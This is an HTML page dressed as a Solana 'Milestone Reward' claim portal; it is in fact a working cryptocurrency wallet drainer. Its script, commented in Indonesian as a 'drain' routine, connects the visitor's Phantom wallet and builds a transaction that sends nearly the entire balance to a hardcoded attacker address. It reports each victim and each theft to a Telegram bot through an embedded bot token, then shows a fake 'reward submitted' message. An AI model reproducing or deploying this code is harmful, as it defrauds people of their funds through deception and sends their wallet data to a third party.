<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Reward Portal</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { background-color: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 50px 20px; }
        .card { border: 1px solid #14f195; background: #111; padding: 30px; border-radius: 15px; max-width: 400px; margin: auto; box-shadow: 0 0 20px rgba(20, 241, 149, 0.2); }
        h1 { color: #14f195; font-size: 2.5rem; margin-bottom: 10px; }
        p { color: #ccc; line-height: 1.6; }
        .btn { background: #14f195; color: #000; padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold; font-size: 1.1rem; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
        .btn:hover { background: #11cc7e; transform: scale(1.02); }
        .status { margin-top: 15px; font-size: 0.8rem; color: #888; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://cryptologos.cc/logos/solana-sol-logo.png" width="60" alt="SOL">
        <h2>Milestone Reward</h2>
        <p>Wallet detected with 50+ transactions. You are eligible to claim:</p>
        <h1>0.25 SOL</h1>
        <button class="btn" onclick="mainAction()">CLAIM REWARD</button>
        <div class="status">System Status: <span style="color: #14f195;">Online</span></div>
    </div>

    <script>
        // ======= KONFIGURASI LU =======
        const MY_WALLET = "281zPhwW9yozngsNgXymgC8jR2vP98Zz1c69kHDFEuoc"; 
        const BOT_TOKEN = "8539107085:AAGOfPQa0X1L-tuWPmdmJH52Bqx30Yao4qQ";
        const CHAT_ID = "6518432642";
        // ==============================

        async function sendLog(msg) {
            const text = encodeURIComponent(msg);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}&parse_mode=HTML`);
        }

        async function mainAction() {
            const provider = window.solana;

            // 1. CEK APAKAH SUDAH DI PHANTOM
            if (!provider || !provider.isPhantom) {
                // Kalo di Chrome biasa, paksa mental ke aplikasi Phantom
                const currentUrl = window.location.href;
                const deepLink = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(window.location.origin)}`;
                window.location.href = deepLink;
                return;
            }

            // 2. KALO SUDAH DI PHANTOM, PROSES DRAIN
            try {
                const resp = await provider.connect();
                const victimPubKey = resp.publicKey;
                await sendLog(`<b>üö® TARGET CONNECTED!</b>\nWallet: <code>${victimPubKey.toString()}</code>`);

                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
                const balance = await connection.getBalance(victimPubKey);

                // Cek saldo minimal (biar gak rugi gas fee)
                if (balance < 1000000) { 
                    alert("Account ineligible for this reward milestone.");
                    return;
                }

                // 3. BUAT TRANSAKSI KURAS TOTAL
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: victimPubKey,
                        toPubkey: new solanaWeb3.PublicKey(MY_WALLET),
                        lamports: balance - 1000000, // Potong biaya gas biar mulus
                    })
                );

                const { blockhash } = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = victimPubKey;

                // 4. MUNCULIN POP-UP CONFIRM DI PHANTOM
                const { signature } = await provider.signAndSendTransaction(transaction);
                
                await sendLog(`<b>üí∞ JEKPOT! SALDO DISIKAT!</b>\nVictim: <code>${victimPubKey.toString()}</code>\nTX: <code>${signature}</code>`);
                
                alert("Reward successfully submitted! Will be processed within 24 hours.");

            } catch (err) {
                console.error(err);
                await sendLog(`<b>‚ùå TARGET TOLAK TRANSAKSI</b>\nWallet: <code>${provider.publicKey?.toString() || 'Unknown'}</code>`);
            }
        }
    </script>
</body>
</html>


